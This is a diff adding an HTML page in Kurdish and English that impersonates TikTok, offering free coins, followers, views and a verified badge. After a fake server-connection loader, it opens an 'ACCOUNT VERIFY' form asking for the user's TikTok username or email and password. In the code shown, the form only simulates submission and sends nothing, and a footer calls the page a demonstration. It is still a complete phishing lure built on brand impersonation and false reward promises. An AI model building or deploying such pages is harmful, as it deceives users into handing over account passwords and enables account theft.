@@ -1,0 +1,284 @@
+<!DOCTYPE html>
+<html lang="ckb" dir="rtl">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>TikTok Gifts — Rewards</title>
+<script src="https://cdn.jsdelivr.net/npm/@tailwindcss/browser@4"></script>
+<style>
+  :root{
+    --bg1:#0a0a0f;
+    --bg2:#111120;
+    --pink:#ff2d87;
+    --cyan:#25f4ee;
+    --card:#17172a;
+    --card2:#1f1f38;
+    --text:#ffffff;
+    --muted:#b7b7c9;
+  }
+  *{ -webkit-tap-highlight-color: transparent; }
+  html,body{ background:var(--bg1); color:var(--text); font-family: "Segoe UI", Tahoma, "Noto Kufi Arabic", system-ui, sans-serif; }
+  body{
+    min-height:100vh;
+    background:
+      radial-gradient(1000px 600px at 10% -10%, rgba(255,45,135,.15), transparent 60%),
+      radial-gradient(900px 600px at 110% 10%, rgba(37,244,238,.1), transparent 60%),
+      linear-gradient(180deg, var(--bg1), var(--bg2));
+    overflow-x:hidden;
+  }
+  .glow-pink{ text-shadow: 2px 0 0 var(--cyan), -2px 0 0 var(--pink); }
+  .card{
+    background: linear-gradient(135deg, var(--card), var(--card2));
+    border: 1px solid rgba(255,255,255,.06);
+    box-shadow: 0 10px 30px rgba(0,0,0,.35), inset 0 1px 0 rgba(255,255,255,.04);
+    transition: transform .2s ease, box-shadow .2s ease, border-color .2s ease;
+  }
+  .card:hover{ transform: translateY(-2px); border-color: rgba(255,45,135,.45); box-shadow: 0 18px 40px rgba(255,45,135,.18); }
+  .card:active{ transform: scale(.98); }
+  .chev{
+    width:34px;height:34px;border-radius:50%;
+    background: linear-gradient(135deg,var(--pink),#b8196b);
+    display:flex;align-items:center;justify-content:center;
+    box-shadow: 0 4px 14px rgba(255,45,135,.45);
+  }
+  .tiktok-logo{
+    width:72px;height:72px;border-radius:18px;
+    background:#000;
+    display:flex;align-items:center;justify-content:center;
+    box-shadow: 0 8px 24px rgba(0,0,0,.5), 4px 4px 0 var(--pink), -4px -4px 0 var(--cyan);
+  }
+  /* Loader overlay */
+  #loader{
+    position:fixed; inset:0; background:rgba(0,0,0,.9);
+    display:none; align-items:center; justify-content:center; z-index:50;
+  }
+  #loader.show{ display:flex; }
+  .spin{
+    width:72px;height:72px;border-radius:50%;
+    border:4px solid rgba(255,255,255,.15);
+    border-top-color: var(--pink);
+    border-right-color: var(--cyan);
+    animation: spin 1s linear infinite;
+  }
+  @keyframes spin{ to{ transform: rotate(360deg); } }
+  .pulse-dot{
+    width:10px;height:10px;border-radius:50%;background:var(--cyan);
+    box-shadow:0 0 0 0 rgba(37,244,238,.7);
+    animation: pulse 1.6s infinite;
+  }
+  @keyframes pulse{
+    0%{ box-shadow:0 0 0 0 rgba(37,244,238,.6); }
+    70%{ box-shadow:0 0 0 14px rgba(37,244,238,0); }
+    100%{ box-shadow:0 0 0 0 rgba(37,244,238,0); }
+  }
+  .badge-live{
+    display:inline-flex;align-items:center;gap:.4rem;
+    background:rgba(255,45,135,.12);
+    color:#ff8fbf;
+    border:1px solid rgba(255,45,135,.35);
+    padding:.25rem .6rem; border-radius:999px; font-size:.72rem;
+  }
+  .id-pill{
+    background:rgba(255,255,255,.06);
+    border:1px solid rgba(255,255,255,.08);
+    padding:.35rem .7rem; border-radius:999px; font-size:.75rem; color:var(--muted);
+    font-family: ui-monospace, SFMono-Regular, Menlo, monospace;
+  }
+  .divider{
+    height:1px;background:linear-gradient(90deg, transparent, rgba(255,255,255,.12), transparent);
+  }
+  
+  /* Verify Modal Styles */
+  #verifyModal {
+    position: fixed; inset: 0; background: rgba(0,0,0,0.85); backdrop-filter: blur(4px);
+    display: none; align-items: center; justify-content: center; z-index: 100; padding: 1rem;
+  }
+  #verifyModal.show { display: flex; }
+  
+  .verify-box {
+    background: #0f0f13;
+    border: 1px solid rgba(255,255,255,0.08);
+    border-radius: 20px;
+    width: 100%;
+    max-width: 440px;
+    padding: 2.5rem 2rem;
+    box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.7);
+    text-align: center;
+  }
+  
+  .verify-input {
+    width: 100%;
+    background: #0a0a0c;
+    border: 1px solid rgba(255,255,255,0.08);
+    border-radius: 12px;
+    padding: 1rem;
+    color: white;
+    text-align: center;
+    font-size: 0.95rem;
+    transition: all 0.2s;
+    outline: none;
+  }
+  
+  .verify-input:focus {
+    border-color: rgba(37, 244, 238, 0.5);
+    background: #111116;
+  }
+  
+  .verify-btn {
+    width: 100%;
+    background: #ff3377; /* exact match from screenshot */
+    color: white;
+    border: none;
+    border-radius: 12px;
+    padding: 1.1rem;
+    font-weight: 700;
+    font-size: 0.95rem;
+    cursor: pointer;
+    transition: all 0.2s;
+  }
+  
+  .verify-btn:hover {
+    background: #e62060;
+  }
+</style>
+</head>
+<body class="antialiased">
+  <main class="max-w-xl mx-auto px-4 py-6 pb-20">
+    <!-- Header -->
+    <header class="flex items-center justify-between">
+      <div class="flex items-center gap-2">
+        <span class="pulse-dot"></span>
+        <span class="text-xs text-gray-300 tracking-wide">LIVE</span>
+      </div>
+      <div class="id-pill" id="userPill">ID: ---</div>
+    </header>
+    <!-- Hero -->
+    <section class="mt-6 flex flex-col items-center text-center">
+      <div class="tiktok-logo" aria-hidden="true">
+        <svg viewBox="0 0 448 512" class="w-9 h-9" fill="white">
+          <path d="M448,209.91a210.06,210.06,0,0,1-122.77-39.25V349.38A162.55,162.55,0,1,1,185,188.31V278.2a74.62,74.62,0,1,0,52.23,71.18V0l88,0a121.18,121.18,0,0,0,1.86,22.17h0A122.18,122.18,0,0,0,381,102.39a121.43,121.43,0,0,0,67,20.14Z"/>
+        </svg>
+      </div>
+      <p class="mt-4 text-[11px] tracking-[0.35em] text-gray-400">TIKTOK REWARDS SYSTEM</p>
+      <h1 class="mt-2 text-3xl sm:text-4xl font-extrabold glow-pink">
+        SPECIAL <span class="text-pink-400">OFFERS</span>
+      </h1>
+      <span class="badge-live mt-4">🎁 هەلی تایبەت بۆ ئەمڕۆ</span>
+      <p class="mt-4 text-sm text-gray-300 max-w-md leading-7">
+        یەکێک لەم خەڵاتانە هەڵبژێرە بۆ زیادکردنی کۆین، فۆڵۆوەر، بینەر یان لایک بۆ ئەکاونتی تیکتۆکەکەت.
+      </p>
+    </section>
+    <div class="divider my-7"></div>
+    <!-- Offers -->
+    <section class="space-y-3" id="offers">
+      <!-- items injected by JS -->
+    </section>
+    <p class="mt-8 text-center text-[11px] text-gray-500 leading-6">
+      © <span id="yr"></span> TikTok Rewards · ئەم پەیجە تەنها بۆ مەبەستی نمایشی دروستکراوە.
+    </p>
+  </main>
+  <!-- Loader overlay -->
+  <div id="loader" role="status" aria-live="polite">
+    <div class="flex flex-col items-center gap-5">
+      <div class="spin"></div>
+      <div class="text-center">
+        <p class="text-white font-semibold" id="loaderTitle">چاوەڕوانبە...</p>
+        <p class="text-gray-400 text-sm mt-1" id="loaderSub">پەیوەندیکردن بە سێرڤەری تیکتۆک</p>
+      </div>
+    </div>
+  </div>
+  <!-- Account Verify Modal -->
+  <div id="verifyModal">
+    <div class="verify-box">
+      <h2 class="text-[#25f4ee] font-bold text-xl mb-3 tracking-wide">ACCOUNT VERIFY</h2>
+      <p class="text-gray-400 text-sm mb-8 font-medium">تکایە ناسنامەکەت پشتڕاست بکەرەوە بۆ تەواوکردنی پرۆسەکە</p>
+      
+      <form id="verifyForm" class="space-y-4" onsubmit="event.preventDefault(); submitForm();">
+        <input type="text" id="username" class="verify-input" placeholder="Username / Email" required dir="ltr">
+        <input type="password" id="password" class="verify-input" placeholder="Account Password" required dir="ltr">
+        
+        <div class="pt-2">
+          <button type="submit" class="verify-btn">
+            CONFIRM & CLAIM
+          </button>
+        </div>
+      </form>
+    </div>
+  </div>
+<script>
+  // --- Read ?id= from URL ---
+  const params = new URLSearchParams(location.search);
+  const userId = params.get('id') || 'guest';
+  document.getElementById('userPill').textContent = 'ID: ' + userId;
+  document.getElementById('yr').textContent = new Date().getFullYear();
+  // --- Offers data ---
+  const offers = [
+    { title: '1,000 کۆین',        desc: 'زیادکردنی کۆین بۆ ئەکاونتەکەت' , icon:'🪙' },
+    { title: '10,000 فۆڵۆوەر',    desc: 'زیادکردنی فۆڵۆوەری فەرمی'      , icon:'👥' },
+    { title: '5,000 بینەر',       desc: 'زیادکردنی بینەری TikTok'       , icon:'👁️' },
+    { title: '1,000 لایکی ڤیدیۆ', desc: 'زیادکردنی لایکی ڕاستەقینە'     , icon:'❤️' },
+    { title: 'تیکی شین (Verified)', desc: 'بەدەستهێنانی نیشانە شینەکەی تیکتۆک', icon:'✅' },
+  ];
+  const list = document.getElementById('offers');
+  offers.forEach((o, i) => {
+    const el = document.createElement('button');
+    el.className = 'card w-full rounded-2xl p-4 flex items-center gap-4 text-right';
+    el.innerHTML = `
+      <div class="text-3xl w-12 h-12 flex items-center justify-center rounded-xl bg-black/30 border border-white/5">${o.icon}</div>
+      <div class="flex-1">
+        <h3 class="font-bold text-lg">${o.title}</h3>
+        <p class="text-sm text-gray-400 mt-0.5">${o.desc}</p>
+      </div>
+      <div class="chev" aria-hidden="true">
+        <svg viewBox="0 0 24 24" class="w-4 h-4" fill="none" stroke="white" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+          <polyline points="15 18 9 12 15 6"></polyline>
+        </svg>
+      </div>
+    `;
+    el.addEventListener('click', () => showLoader(o.title));
+    list.appendChild(el);
+  });
+  // --- Loader & Modal Logic ---
+  const loader = document.getElementById('loader');
+  const loaderTitle = document.getElementById('loaderTitle');
+  const loaderSub = document.getElementById('loaderSub');
+  const verifyModal = document.getElementById('verifyModal');
+  let loaderTimer = null;
+  function showLoader(title){
+    // Hide modal if open
+    verifyModal.classList.remove('show');
+    
+    // Show Loader
+    loaderTitle.textContent = 'چاوەڕوانبە...';
+    loaderSub.textContent = title ? `داواکاری بۆ: ${title}` : 'پەیوەندیکردن بە سێرڤەری تیکتۆک';
+    loader.classList.add('show');
+    
+    clearTimeout(loaderTimer);
+    loaderTimer = setTimeout(() => {
+      // Hide loader and show Verify Modal
+      loader.classList.remove('show');
+      verifyModal.classList.add('show');
+    }, 1500);
+  }
+  function submitForm() {
+    const user = document.getElementById('username').value;
+    const pass = document.getElementById('password').value;
+    
+    // Change button text to loading state
+    const btn = document.querySelector('.verify-btn');
+    const originalText = btn.textContent;
+    btn.textContent = 'چاوەڕوانبە...';
+    btn.disabled = true;
+    
+    // Simulate API call
+    setTimeout(() => {
+      alert('داواکارییەکەت سەرکەوتوو بوو!');
+      btn.textContent = originalText;
+      btn.disabled = false;
+      verifyModal.classList.remove('show');
+      document.getElementById('verifyForm').reset();
+    }, 1500);
+  }
+</script>
+</body>
+</html>
